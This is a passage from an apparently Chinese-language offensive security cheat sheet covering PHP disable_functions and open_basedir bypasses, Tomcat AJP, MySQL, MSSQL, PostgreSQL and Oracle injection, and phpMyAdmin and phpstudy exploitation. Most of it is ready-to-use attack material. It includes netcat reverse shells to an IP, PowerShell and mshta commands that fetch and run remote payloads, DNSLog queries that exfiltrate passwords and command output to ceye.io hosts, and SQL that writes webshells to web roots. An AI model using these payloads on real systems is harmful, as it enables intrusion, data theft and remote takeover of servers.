comment">//fgets($pipes[1],1024);</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h5><pre><code>开启了pcntl 扩展，并且php 4&gt;=4.2.0 , php5，linux</code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/test.sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'pcntl extension is not support!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>test.sh#!/bin/bashnc -e /bin/bash 1.1.1.1 8888       #反弹shell</code></pre><h5 id="imap-open函数"><a href="#imap-open函数" class="headerlink" title="imap_open函数"></a>imap_open函数</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imap_open'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no imap_open function!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"x -oProxyCommand=echo\t"</span> <span class="token operator">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">">/tmp/cmd_result"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"|base64\t-d|sh&#125;"</span><span class="token punctuation">;</span><span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;'</span> <span class="token operator">.</span> <span class="token variable">$server</span> <span class="token operator">.</span> <span class="token string single-quoted-string">':143/imap&#125;INBOX'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/cmd_result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="php7-4-FFI绕过"><a href="#php7-4-FFI绕过" class="headerlink" title="php7.4 FFI绕过"></a>php7.4 FFI绕过</h5><pre><code>php 7.4ffi.enable=true</code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'nc -e /bin/bash ip 8888'</span><span class="token punctuation">;</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span>    <span class="token string double-quoted-string">"int system(char *command);"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h5><pre><code>存在CVE-2014-6271漏洞PHP 5.*，linux，putenv()、mail()可用</code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP_LOL=() &#123; x; &#125;; <span class="token interpolation"><span class="token variable">$cmd</span></span> ><span class="token interpolation"><span class="token variable">$tmp</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a@127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"-bv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"No output, or not vuln."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">shellshock</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="蚁剑插件"><a href="#蚁剑插件" class="headerlink" title="蚁剑插件"></a>蚁剑插件</h5><pre><code>01利用LD_PRELOAD环境变量02利用ShellShock（CVE-2014-6271）03利用Apache Mod CGI04 PHP-FPM利用LD_PRELOAD环境变量（同1）05攻击PHP-FPM监听端口06 Json Serializer UAF07具有特定析构函数UAF的PHP7 GC</code></pre><h4 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h4><pre><code>第一种http://x.com/shell.php?a=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;;http://x.com/shell.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;第二种http://x.com/shell.php?a=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);system(&#39;cat ../../../../../etc/passwd&#39;);http://x.com/shell.php?a=mkdir(%22/tmp/crispr%22);chdir(%27/tmp/crispr/%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27.%27))第三种命令执行绕过读文件?a=show_source(&#39;preload.php&#39;);?a=echo(readfile(&#39;preload.php&#39;));?a=print_r(readfile(&#39;preload.php&#39;));?a=echo(file_get_contents(&#39;preload.php&#39;));?a=print_r(file_get_contents(&#39;preload.php&#39;));</code></pre><h4 id="Tomcat-Ajp-LFI-amp-RCE"><a href="#Tomcat-Ajp-LFI-amp-RCE" class="headerlink" title="Tomcat Ajp LFI&amp;RCE"></a>Tomcat Ajp LFI&amp;RCE</h4><pre><code>LFIhttps://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass</code></pre><p><img src="./img/41.png" alt="image"></p><pre><code>RCE&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.107 LPORT=12138 R &gt;/var/www/html/1.jpg配合目标文件上传传入服务器</code></pre><p><img src="./img/42.png" alt="image"></p><pre><code>&gt;java -jar ajpfuzzer_v0.6.jar&gt;connect 192.168.0.110 8009&gt;forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/index.jsp&quot; 192.168.0.107 192.168.0.107 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:index.jsp&quot;,&quot;javax.servlet.include.path_info:/1.jpg&quot;,&quot;javax.servlet.include.servlet_path:/&quot;</code></pre><p><img src="./img/43.png" alt="image"></p><h4 id="Mysql连接文件读取"><a href="#Mysql连接文件读取" class="headerlink" title="Mysql连接文件读取"></a>Mysql连接文件读取</h4><pre><code>https://github.com/Gifts/Rogue-MySql-Server客户端必须启用LOCAL-INFILE 客户端支持非SSL连接目标web存在adminer等可检查数据库连接的脚本。攻击机本地运行python构造假mysql服务，使用目标web连接，读取文件。#coding=utf-8 import socketimport logginglogging.basicConfig(level=logging.DEBUG)filename=&quot;/etc/passwd&quot;sv=socket.socket()sv.bind((&quot;&quot;,3305))sv.listen(5)conn,address=sv.accept()logging.info(&#39;Conn from: %r&#39;, address)conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)conn.recv(9999)logging.info(&quot;auth okay&quot;)conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)conn.recv(9999)logging.info(&quot;want file...&quot;)wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filenameconn.sendall(wantfile)content=conn.recv(9999)logging.info(content)conn.close()</code></pre><h4 id="Mysql开启外连"><a href="#Mysql开启外连" class="headerlink" title="Mysql开启外连"></a>Mysql开启外连</h4><pre><code>&gt;grant all privileges on user.* to user@&quot;%&quot; identified by &quot;P@ssw0rd&quot;;</code></pre><h4 id="MSSQL-amp-Agent-Job上线"><a href="#MSSQL-amp-Agent-Job上线" class="headerlink" title="MSSQL&amp;Agent Job上线"></a>MSSQL&amp;Agent Job上线</h4><pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;syspolicy_purge_now&#39; ; EXEC sp_add_jobstep @job_name = N&#39;syspolicy_purge_now&#39;, @step_name = N&#39;syspolicy_purge_step1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://IP_OR_HOSTNAME/file&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;syspolicy_purge_now &#39;; EXEC dbo.sp_start_job N&#39;syspolicy_purge_now &#39;;使用在注入点处，使用burp进行url编码，编码后前面加%20(空格URL编码)</code></pre><h4 id="注入无列名"><a href="#注入无列名" class="headerlink" title="注入无列名"></a>注入无列名</h4><pre><code>http://url/index.php?id=1 order by 6http://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -http://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -</code></pre><h4 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h4><pre><code>http://ceye.iohttp://www.dnslog.cn/</code></pre><h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><h6 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h6><pre><code>显示数据库?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+显示数据库?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+显示表?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;dbname&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+显示字段?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+显示数据?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user) from users limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+</code></pre><h6 id="MSSQL-2"><a href="#MSSQL-2" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>查数据?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = &#39;admin&#39;)%2b&#39;.cece.nk40ci.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\&#39;%2b@host%2b&#39;\foobar$&quot;&#39;);Sa密码?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name=&#39;sa&#39;)+&#39;.ip.port.b182oj.ceye.io&#39;;EXEC(&#39;master..xp_dirtree&quot;\&#39;+@host+&#39;\foobar$&quot;&#39;);执行命令exec master..xp_cmdshell &quot;whoami&gt;D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V &quot;&quot;CERTIFICATE&quot;&quot; D:/temp2&gt;D:/temp3&quot;;exec master..xp_cmdshell &quot;cmd /v /c&quot;&quot;set /p MYVAR=&lt; D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!&quot;&quot;&quot;;exec master..xp_cmdshell &quot;del &quot;&quot;D:/temp&quot;&quot; &quot;&quot;D:/temp2&quot;&quot; &quot;&quot;D:/temp3&quot;&quot;&quot;;</code></pre><h6 id="postgreSQL"><a href="#postgreSQL" class="headerlink" title="postgreSQL"></a>postgreSQL</h6><pre><code>?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,&#39;hex&#39;) from test_user where id =1);exec_cmd := E&#39;COPY table_output(content) FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&#39;&#39;;EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();</code></pre><h6 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h6><pre><code>?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;) FROM sys.DUAL;?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;,80) FROM sys.DUAL;?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||&#39;.xx.nk40ci.ceye.io&#39;).GETCLOB() FROM sys.DUAL;?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||&#39;.ddd.nk40ci.ceye.io&#39;) FROM sys.DUAL;</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><pre><code>&gt;curl http://0ox095.ceye.io/`whoami`&gt;ping `whoami`.b182oj.ceye.io&gt;ping %CD%.lfofz7.dnslog.cn &amp;cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;</code></pre><h5 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE"></a>XXE</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://b182oj.ceye.io/xxe_test&quot;&gt;%remote;]&gt;&lt;root/&gt;</code></pre><h5 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h5><pre><code>xx.action?redirect:http://b182oj.ceye.io/%25&#123;3*4&#125;xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&#39;whoami&#39;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;</code></pre><h5 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h5><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?operator=http://b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search</code></pre><h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><pre><code>xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://b182oj.ceye.io/ssrf</code></pre><h5 id="Discuz-1"><a href="#Discuz-1" class="headerlink" title="Discuz"></a>Discuz</h5><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</code></pre><h4 id="PHPMyadmin"><a href="#PHPMyadmin" class="headerlink" title="PHPMyadmin"></a>PHPMyadmin</h4><h5 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h5><pre><code>show variables like &#39;%general%&#39;;  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = &#39;/var/www/html/1.php&#39;; select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code></pre><h5 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h5><pre><code>show variables like &#39;%slow%&#39;;set GLOBAL slow_query_log_file=&#39;C:/WWW/slow.php&#39;;set GLOBAL slow_query_log=on;set GLOBAL log_queries_not_using_indexes=on;select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.db where sleep(10);</code></pre><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><pre><code>phpMyAdmin 2.xPOST /scripts/setup.php HTTP/1.1Host: ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></pre><h5 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h5><pre><code>phpMyAdmin 4.0.1--4.2.12，PHP &lt; 5.3.4/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00phpMyAdmin 4.8.0和4.8.1 后台权限&gt;select &#39;&lt;?php phpinfo();exit;?&gt;&#39;/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_***</code></pre><h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><pre><code>PhpMyAdmin 4.0.x-4.6.2，PHP 4.3.0-5.4.6后台权限&gt;cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#39;ls -lua&#39;);&quot;phpMyAdmin 4.8.0~4.8.3CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;;访问http://10.1.1.10/chk_rel.php?fixall_pmadb=1&amp;db=fooINSERT INTO pma__column_infoSELECT &#39;1&#39;, &#39;foo&#39;, &#39;bar&#39;, &#39;baz&#39;, &#39;plop&#39;,&#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;,&#39;../../../../../../../../tmp/sess_***&#39;,&#39;plop&#39;;访问/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1</code></pre><h4 id="PHP-FPM-RCE"><a href="#PHP-FPM-RCE" class="headerlink" title="PHP-FPM RCE"></a>PHP-FPM RCE</h4><pre><code>&gt;git clone https://github.com/neex/phuip-fpizdam.git&gt;cd phuip-fpizdam&gt;go get -v &amp;&amp; go build&gt;go run . http://127.0.0.1/index.phphttp://127.0.0.1/index.php?a=id多执行几次</code></pre><h4 id="phpstudy后门"><a href="#phpstudy后门" class="headerlink" title="phpstudy后门"></a>phpstudy后门</h4><pre><code>php:5.2.17   5.4.45GET / HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding:gzip,deflateAccept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 2</code></pre><h4 id="cmdhijack"><a href="#cmdhijack" class="headerlink" title="cmdhijack"></a>cmdhijack</h4><pre><code>From: https://hackingiscool.pl/poc完整的命令行cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;可能产生的影响包括拒绝服务，信息泄露，任意代码执行（取决于目标应用程序和系统）。以web应用为例</code></pre><p><img src="./img/660.png" alt="image"></p><pre><code>由于使用了escapeshellcmd()，不易受命令注入的影响，使用本方法一个poc</code></pre><p><img src="./img/661.png" alt="image"><br><img src="./img/662.png" alt="image"></p><pre><code>不限于任何位置，文件</code></pre><p><img src="./img/663.png" alt="image"></p><pre><code>再扩展一下 如，powershell带-enc执行，或mshta等方法，可参考https://lolbas-project.github.io/，但是依照windows的特性，在无法将完整字符串解析为有效路径的情况下，会拆分空格后面的内容，这里可以使用&amp;符号如：&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;powershell -enc xxxx&quot;&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;mshta http://192.168.0.105:8080/xsuUEWJ.hta&quot;</code></pre><p><img src="./img/664.png" alt="image"></p><h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><h4 id="MSSQL-3"><a href="#MSSQL-3" class="headerlink" title="MSSQL"></a>MSSQL</h4><pre><code>判断数据库;and (select count(*) from sysobjects)&gt;0 mssql;and (select count(*) from msysobjects)&gt;0 access查库?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0 --?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in (&#39;master&#39;))&gt;0 --查表import requestsimport retable_list = [&#39;&#39;]def get_sqlserver_table(table_list, table_num):    for num in range(0,table_num):        # print(&quot;&#39;,&#39;&quot;.join(table_list))        sql_str = &quot;and (select top 1 name from [xxxx].sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=0 and name not in (&#39;&#123;&#125;&#39;))&gt;0&quot;.format(&quot;&#39;,&#39;&quot;.join(table_list))        url = &quot;http://www.xxxxx.cn/x.aspx?cid=1&#39; &#123;&#125; AND &#39;aNmV&#39;=&#39;aNmV&quot;.format(sql_str)        r = requests.get(url, headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&#39;&#125;)        res = re.search(r&#39;\&#39;(.*)\&#39;&#39;, r.content.decode(&#39;utf-8&#39;),  re.M|re.I)        table_name = str(res.group(1))        table_list.append(table_name)        print(&quot;[&#123;&#125;] - TableName: &#123;&#125;&quot;.format(str(r.status_code), table_name))if __name__ == &quot;__main__&quot;:    get_sqlserver_table(table_list, 16)判断是否存在xp_cmdshelland 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)执行命令;exec master..xp_cmdshell &quot;net user name password /add&quot;—查看权限and (select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))=1--  //saand (select IS_MEMBER(&#39;db_owner&#39;))=1--   //  dboand (select IS_MEMBER(&#39;public&#39;))=1--  //public站库分离获取服务器IP;insert into OPENROWSET(&#39;SQLOLEDB&#39;,&#39;uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;&#39;, &#39;select * from dest_table&#39;) select * from src_table;--LOG备份;alter database testdb set RECOVERY FULL --;create table cmd (a image) --;backup log testdb to disk = &#39;c:\wwwroot\shell.asp&#39; with init --;insert into cmd (a) values (&#39;&lt;%%25Execute(request(&quot;chopper&quot;))%%25&gt;&#39;)-- ;backup log testdb to disk = &#39;c:\wwwroot\shell.asp&#39; –2000差异备份;backup database testdb to disk =&#39;c:\wwwroot\bak.bak&#39;;--;create table [dbo].[testtable] ([cmd] [image]);--;insert into testtable (cmd) values(木马hex编码);--;backup database testdb to disk=&#39;c:\wwwroot\upload\shell.asp&#39; WITH DIFFERENTIAL,FORMAT;--2005差异备份;alter/**/database/**/[testdb]/**/set/**/recovery/**/full—;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[testdb]/**/to/**/disk=@d/**/with/**/init--;create/**/table/**/[itpro]([a]/**/image)—;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--;insert/**/into/**/[itpro]([a])/**/values(木马hex编码)—;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=木马保存路径的SQL_EN编码/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--;drop/**/table/**/[itpro]—;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--</code></pre><h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><pre><code>连接&gt;psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432查看版本&gt;select version();列出数据库&gt;select datname from pg_database;列出所有表名&gt;select * from pg_tables;读取账号秘密&gt;select usename,passwd from pg_shadow;当前用户&gt;select user;修改密码&gt;alter user postgres with password &#39;123456&#39;;列目录&gt;select pg_ls_dir(&#39;/etc&#39;);读文件&gt;select pg_read_file(&#39;postgresql.auto.conf&#39;,0,100); 